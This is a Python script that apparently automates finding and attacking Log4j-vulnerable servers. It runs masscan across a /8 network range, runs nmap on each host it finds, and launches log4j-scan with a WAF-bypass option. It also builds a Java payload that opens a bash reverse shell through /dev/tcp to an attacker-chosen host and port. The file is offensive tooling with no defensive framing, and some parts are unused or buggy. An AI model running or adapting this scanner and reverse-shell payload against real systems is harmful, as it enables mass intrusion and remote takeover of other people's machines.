import sys
from base64 import b64encode
import subprocess
import io
import time
from shlex import split 
from multiprocessing import Process, Queue
import re
import socket
from requests import get
from urllib3 import disable_warnings


def remove_duplicate(x):
    return list(dict.fromkeys(x))

def payload(host, port):
    p = "Runtime r = Runtime.getRuntime(); \n"
    a = f"Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'\"); \n" 
    y = "p.waitFor();"
    return bytes(p + a + y, encoding="utf-8")

def masscan(command, filename):
    try :
        with io.open(filename, 'wb') as writer, io.open(filename, 'rb') as reader:
            process = subprocess.Popen(split(command), stdout=writer)
            writer.flush()
            while process.poll() is None:
                hosts = parseHost(filename)
                reconService(hosts)
                sendDetectionRequest(hosts)
                time.sleep(0.5)
            sys.stdout.write(str(reader.read()))
    except KeyboardInterrupt:
        print('Exiting..')
        subprocess.Popen(split("sudo kill {}".format(process.pid)))
        subprocess.Popen(split("sudo kill {}".format(process.pid + 1)))    
        
def parseHost(filename):
    pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    hosts = []
    with io.open(filename, 'rb') as hostfile:
        for lines in hostfile.readlines():
            hosts.append(pattern.search(str(lines))[0])
            list(set(hosts))
    return hosts

def reconService(hosts):
    filename = "nmap.log"
    with io.open(filename, 'wb') as writer, io.open(filename, 'rb') as reader:
        for host in hosts:
            nmap = subprocess.Popen(split(f"nmap -v {host}"), stdout=writer)
            writer.flush()
            while nmap.poll() is None:
                pass

def sendDetectionRequest(hosts):
    filename="log4j.log"
    with io.open(filename, 'wb') as writer, io.open(filename, 'rb') as reader:
        for host in hosts:
            #url = "http://" + host + ":80/" 
            surl = "https://" + host + ":8080/" 
            log4j = subprocess.Popen(split(f"python3 log4j-scan.py --waf-bypass --headers-file headers.txt -u {surl}"))
            writer.flush()
            while log4j.poll() is None:
                for lines in reader.readlines():
                    print(lines)        

if __name__ == '__main__':
    try : 
        #masscan("sudo masscan -p4560 172.28.176.0/8", "target.log")
        queue = Queue()
        p = Process(target=masscan, args=("sudo masscan -p4560,80,8080 172.28.176.0/8", "target.log"))
        p.start()
        r = Process(target=parseHost, args=('target.log',))
        r.start()
    except:
        pass
    # parseHost("target.log")
    